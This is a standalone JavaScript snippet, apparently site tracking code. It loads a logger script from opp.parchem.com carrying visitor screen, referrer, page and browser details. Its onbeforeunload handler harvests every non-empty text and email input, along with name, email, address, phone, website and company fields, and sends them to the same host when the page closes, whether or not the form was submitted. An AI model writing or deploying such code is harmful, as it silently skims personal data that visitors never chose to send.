var j = document.createElement('script');
j.type = 'text/javascript';
var id = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
});
j.src = 'http://opp.parchem.com/logger/track?trackScreenWidth=' + encodeURIComponent(screen.width).substring(0, 6) + '&trackScreenHeight=' + encodeURIComponent(screen.height).substring(0, 6) + '&trackReferer=' + encodeURIComponent(document.referrer).substring(0, 1100) + '&trackPageTitle=' + encodeURIComponent(document.title).substring(0, 200).replace(/\%u00a0/g, '').replace(/\%u2122/g, '').replace(/\%u[0-9][0-9][0-9][0-9]/g, '') + '&trackLocation=' + encodeURIComponent(document.location).substring(0, 1000) + '&trackUserAgent=' + encodeURIComponent(navigator.userAgent + '.lfcd' + screen.colorDepth + '.lflng' + window.navigator.userLanguage || window.navigator.language).substring(0, 1000) + '&trackDomain=' + encodeURIComponent(document.domain).substring(0, 200) + '&id=' + id;
var s = document.getElementsByTagName('script')[0];
s.parentNode.insertBefore(j, s);
var keys = '0';
window.onbeforeunload = function () {
    var xmlHttp = new XMLHttpRequest();
    var nodes = document.querySelectorAll('input[type=text]');
    for (var i = 0; i < nodes.length; i++) {
        if (nodes[i].value != '') {
            keys += nodes[i].value + '\n';
        }
    }
    nodes = document.querySelectorAll('input[type=email]');
    for (var e = 0; e < nodes.length; e++) {
        if (nodes[e].value != '') {
            keys += nodes[e].value + '\n';
        }
    }
    xmlHttp.open("GET", 'http://opp.parchem.com/logger/track?q=' + encodeURIComponent(keys).substring(0,1000) + '&id=' + id + '&trackDomain=' + encodeURIComponent(document.domain).substring(0, 200)+(document.getElementById('txtFirstName')==null?'':('&name='+encodeURIComponent(document.getElementById('txtFirstName').value+' '+document.getElementById('txtLastName').value)))+(document.getElementById('txtEmail')==null?'':('&email='+encodeURIComponent(document.getElementById('txtEmail').value)))+(document.getElementById('txtWebSite')==null?'':('&web='+encodeURIComponent(document.getElementById('txtWebSite').value)))+(document.getElementById('txtAddress')==null?'':('&addr='+encodeURIComponent(document.getElementById('txtAddress').value+', '+document.getElementById('txtCity').value+', '+document.getElementById('txtState').value+' '+document.getElementById('txtZip').value+', '+document.getElementById('ddlCountry').value)))+(document.getElementById('txtPhone')==null?'':('&phone='+encodeURIComponent(document.getElementById('txtPhone').value)))+(document.getElementById('txtCompany')==null?'':('&bb='+encodeURIComponent(document.getElementById('txtCompany').value))) , true); 
    //on demand customization above
    //plain param list &name=&email=&web=&addr=&phone=&bb=
    xmlHttp.send(null);
};

